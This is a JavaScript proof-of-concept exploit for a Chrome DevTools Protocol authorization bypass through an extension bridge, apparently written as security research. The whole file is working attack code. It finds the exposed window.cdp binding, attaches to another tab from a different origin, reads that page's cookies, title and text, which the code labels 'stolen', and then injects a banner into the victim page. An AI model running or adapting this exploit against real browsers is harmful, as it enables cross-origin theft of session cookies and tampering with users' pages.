// POC: CDP Authorization Bypass via extension bridge
// External file to avoid CSP inline-script blocking
(function() {
  var out = document.getElementById('out');
  var wait = document.getElementById('wait');

  function log(s, c) {
    var e = document.createElement('div');
    if (c) e.className = c;
    e.textContent = s;
    out.appendChild(e);
  }

  function data(s) {
    var e = document.createElement('pre');
    e.className = 'data';
    e.textContent = s;
    out.appendChild(e);
  }

  function poll() {
    if (!window.cdp) return setTimeout(poll, 400);
    wait.hidden = true;
    run();
  }
  poll();

  function run() {
    var here = location.href, session, seq = 0;

    window.cdp.onmessage = function(raw) {
      var m;
      try { m = JSON.parse(raw); } catch(e) { return; }
      if (m.method === 'Target.receivedMessageFromTarget') {
        try { onVictim(JSON.parse(m.params.message)); } catch(e) {}
        return;
      }
      if (m.id === 1 && m.result) onTargets(m.result.targetInfos || []);
      if (m.id === 2 && m.result) onAttach(m.result);
      if (m.id <= 2 && m.error) log('error: ' + m.error.message, 'r');
    };

    log('window.cdp binding detected (bypass confirmed)', 'g');
    log('');
    log('Target.getTargets', 'w');
    window.cdp.send(JSON.stringify({ id: 1, method: 'Target.getTargets', params: {} }));

    function onTargets(list) {
      list.forEach(function(t) { log('  ' + t.type + '  ' + t.url, 'd'); });
      log('');
      var v = list.find(function(t) {
        return t.type === 'page' && t.url !== here && !/^(devtools|chrome|about):/.test(t.url);
      });
      if (!v) return log('no cross-origin tab. open another tab and click extension icon again.', 'r');
      log('Target.attachToTarget  ' + v.url, 'w');
      window.cdp.send(JSON.stringify({ id: 2, method: 'Target.attachToTarget',
        params: { targetId: v.targetId, flatten: false } }));
    }

    function onAttach(res) {
      if (!res.sessionId) return log('attach failed', 'r');
      session = res.sessionId;
      log('  session ' + session.substring(0, 20) + '...', 'g');
      log('');
      log('Runtime.evaluate in victim (read)', 'w');
      evalVictim(101, 'JSON.stringify({u:location.href,t:document.title,c:document.cookie,' +
        'b:document.body.innerText.substring(0,500)})');
    }

    function onVictim(m) {
      if (m.id === 101 && m.result && m.result.result) {
        try {
          var d = JSON.parse(m.result.result.value);
          log('  stolen from ' + d.u, 'g');
          data('title:   ' + d.t + '\ncookie:  ' + (d.c || '(none)') +
            '\ncontent: ' + d.b.substring(0, 300));
        } catch(e) { log('  raw: ' + m.result.result.value, 'g'); }
        log('');
        log('Runtime.evaluate in victim (inject DOM)', 'w');
        evalVictim(102, 'var b=document.createElement("div");' +
          'b.setAttribute("style","position:fixed;top:0;left:0;right:0;z-index:2147483647;' +
          'padding:14px 20px;background:#b00;color:#fff;font:bold 14px/1 monospace;text-align:center");' +
          'b.textContent="Cross-origin write via CDP bypass";' +
          'document.documentElement.prepend(b);"injected"');
      }
      if (m.id === 102 && m.result) {
        log('  victim DOM modified', 'g');
        log('');
        log('done. switch to the victim tab to see the red banner.', 'w');
      }
      if (m.error) log('  victim: ' + m.error.message, 'r');
    }

    function evalVictim(id, expr) {
      window.cdp.send(JSON.stringify({ id: ++seq + 10, method: 'Target.sendMessageToTarget',
        params: { sessionId: session, message: JSON.stringify({
          id: id, method: 'Runtime.evaluate', params: { expression: expr }
        }) } }));
    }
  }
})();
